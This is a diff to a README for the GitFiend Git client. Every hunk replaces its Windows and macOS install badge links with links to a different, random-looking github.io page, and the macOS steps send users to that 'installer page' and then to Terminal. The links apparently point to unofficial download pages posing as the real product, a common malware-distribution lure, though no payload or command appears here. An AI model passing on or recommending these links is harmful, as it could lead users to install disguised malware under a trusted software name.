@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -61,9 +61,9 @@ GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux wit
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux wit
 
 <div align="center">
 
-[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux wit
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ GitFiend is a free, open-source Git GUI client for Windows, macOS, and Linux wit
 
 <div align="center">
 
-[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GitFiend](https://img.shields.io/badge/⬇_Install_GitFiend-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
